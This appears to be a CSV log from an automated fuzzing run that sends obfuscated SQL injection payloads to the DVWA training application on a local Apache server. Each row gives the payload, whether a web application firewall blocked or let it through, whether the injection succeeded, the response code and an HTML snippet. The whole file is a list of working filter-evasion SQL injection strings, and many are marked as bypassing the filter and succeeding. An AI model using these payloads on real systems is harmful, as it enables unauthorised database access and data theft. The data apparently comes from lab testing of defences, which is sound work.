Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=1.%0bor%0bnot%0b{x+(select+1)}=1=%0b(!+{x%0b(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0273,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+not+{a+1}=1=%0b(!%0b{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.027,73.77,No,500,
0%27<@!=1+or%0b!%0b{a%0b1}=1=%0b(not+{x%0b(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0293,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||+not%0b{x%0b(select%0b1)}=1=%0b(0)+||%27,Bypassed,No,None,Unknown,0.0205,73.77,No,500,
0'<@!=1.%0bor+!%7e0=%0b(!+{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.025,73.77,No,500,
0%27<@=1.+or+!%0b{x+(select+1)}=1=+(false)%0b||',Bypassed,No,None,booleanAtk,0.0312,73.77,No,500,
0'<@!=.1+||%0b!%0b{x+(select+1)}=1=%0b(not+{`if`%0b1}=1)+,Blocked,No,None,Unknown,0.0143,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or+not%0b{a+1}=1=+(not+{a+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0195,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+||+!%0b{x%0b(select+1)}=1=+(not%0b{`if`+1}=1)+,Bypassed,No,None,Unknown,0.0288,73.77,No,500,
0%27<@!=1+or%0b!+{a%0b1}=1=%0b(not%0b1)+||',Bypassed,No,None,Unknown,0.0219,73.77,No,500,
0'<@=1.+||+not+true=+(!%0b{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0242,73.77,No,500,
0'or%0b@<@.+or%0b!%0b{a%0b1}=1=+(not%0b{a%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0352,73.77,No,500,
0%27<@=.1+||+not%0b{x%0b(select+1)}=1=%0b(!+{a+1}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0231,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+{`if`%0b1}=1+like%0b{a%0b1}=1+||',Bypassed,No,None,Unknown,0.0412,73.77,No,500,
0'<@=1+||%0b!%0b{`if`+1}=1=%0b(false)--%0b,Bypassed,No,None,piggyAtk,0.0256,73.89,No,500,
0'<@=.1%0b||+not%0b{a%0b1}=1=+(not+{x+(select+1)}=1)+,Bypassed,No,None,Unknown,0.0279,74.01,No,500,
0%27<@=1.+||+not+{x+(select%0b1)}=1=%0b(false)+or',Blocked,No,None,booleanAtk,0.0329,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27or%0b1<@.%0bor+!+{a+1}=1=+(false)+||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0321,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not%0b{x+(select+1)}=1=+(not+true)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0314,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+not+{x%0b(select+1)}=1=%0b(!~false)%0bor',Bypassed,No,None,booleanAtk,0.0261,74.01,No,500,
0'<@!=1%0b||%0bnot%0b{`if`+1}=1=+(not+{x+(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0157,74.01,No,500,
0'<@!=1.%0bor%0bnot%0b{x+(select+1)}=1=+(false)%0b||%27,Bypassed,No,None,booleanAtk,0.0327,74.01,No,500,
0%27<@=1%0bor%0b{x+(select%0b1)}=1+like%0b{x%0b(select%0b1)}=1%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0123,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or%0bnot%0b{a%0b1}=1=%0b(not+1)%0b||%27,Bypassed,No,None,Unknown,0.0135,74.01,No,500,
0'<@=1+||%0bnot+{x+(select+1)}=1=+(not+{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0212,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+not+{x+(select+1)}=1=+(not+true)%0b||%27,Blocked,No,None,Unknown,0.0155,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor%0bnot+{x+(select%0b1)}=1=+(not%0b1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0284,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+!%0b{`if`+1}=1=%0b(!~false)%0b||',Bypassed,No,None,Unknown,0.0115,74.01,No,500,
0'<@=1+||%0b!+1=+(not%0b{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0293,74.01,No,500,
0%27or+1<@.+or+not%0b{x%0b(select%0b1)}=1=+(!%0b{`if`%0b1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0265,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0bnot+{a+1}=1=+(!+{`if`%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0263,74.01,No,500,
0%27<@=.1+||+{x+(select+1)}=1+like%0b{x%0b(select%0b1)}=1+||',Blocked,No,None,Unknown,0.012,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+or%0bnot%0b{x%0b(select+1)}=1=%0b(not+{a%0b1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0311,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or+!%7e0=+(!%0btrue)%0b||',Bypassed,No,None,booleanAtk,0.0405,74.01,No,500,
0%27<@=1.%0bor%0bnot%0b{`if`%0b1}=1=+(not+{`if`%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0239,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+not+{x%0b(select+1)}=1=+(!+{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0217,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor+not+{x%0b(select%0b1)}=1=%0b(not%0b{a%0b1}=1)--,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.038,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||%0bnot%0b{x+(select%0b1)}=1=+(not+true)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0357,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0bnot%0b{x+(select+1)}=1=+(!+1)+||',Blocked,No,None,Unknown,0.0179,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or%0bnot%0b{a%0b1}=1=%0b(not+{x+(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0205,74.01,No,500,
0%27<@=1+or+!+{`if`%0b1}=1=+(!+{x+(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0245,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor%0bnot%7e0=%0b(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0266,74.01,No,500,
0%27<@=1.+||+not+{x%0b(select%0b1)}=1=+(!+{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0244,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor+!+true=+(!%0b{a%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0255,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or%0b0=%0b(!%0b{a%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0226,73.77,No,500,
0%27<@!=.1+or%0b{x%0b(select%0b1)}=1%0blike%0b{a+1}=1--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0333,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+!%0b{x+(select%0b1)}=1=%0b(not+{a+1}=1)%0b,Bypassed,No,None,Unknown,0.029,73.77,No,500,
0'<@!=1+||+{`if`%0b1}=1+like+{x%0b(select%0b1)}=1+||',Bypassed,No,None,Unknown,0.0282,73.77,No,500,
0'<@!=.1+or%0bnot+{x%0b(select%0b1)}=1=%0b(false)+or%27,Bypassed,No,None,booleanAtk,0.0316,73.77,No,500,
0%27<@!=1+or+!%0b{x+(select%0b1)}=1=+(not+1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0341,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||+!~false=+(not+{`if`+1}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0207,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+{`if`+1}=1+like+true+or',Bypassed,No,None,booleanAtk,0.0176,73.77,No,500,
0'<@!=1.%0bor+not%0b1=+(not+{x%0b(select%0b1)}=1)+||%27,Bypassed,No,None,Unknown,0.0199,73.77,No,500,
0%27<@=1.+or%0bnot%0b{x+(select%0b1)}=1=%0b(not+{a+1}=1)%0b,Blocked,No,None,Unknown,0.023,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'||+@<@.+or%0bnot%0b1=+(!%0b{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0233,73.77,No,500,
0'<@=1.%0b||+not+{x%0b(select+1)}=1=+(not%0b{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.024,73.77,No,500,
0'<@!=1+or%0b{x%0b(select+1)}=1%0blike+{a%0b1}=1%0b||%27,Bypassed,No,None,Unknown,0.0251,73.77,No,500,
0%27<@!=.1+||+!~0=+(!%0b{`if`%0b1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0257,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+not+{x%0b(select%0b1)}=1=%0b(not%0b1)+||%27,Bypassed,No,None,Unknown,0.0241,73.77,No,500,
0'<@=.1+or%0b!%0b{a+1}=1=%0b(not+{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.0428,73.77,No,500,
0'<@!=.1+or%0b!%0b{`if`+1}=1=%0b(not+{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0282,73.77,No,500,
0'<@=.1%0b||+not+{a+1}=1=+(false)+or%27,Bypassed,No,None,booleanAtk,0.02,73.77,No,500,
0%27<@=1%0bor+not%0b{x%0b(select+1)}=1=%0b(not%0b{x+(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0215,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0b!+1=%0b(!+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.04,73.77,No,500,
0'<@!=1%0b||+{x%0b(select+1)}=1%0blike+{x+(select+1)}=1%23,Bypassed,No,None,piggyAtk,0.0206,73.89,No,500,
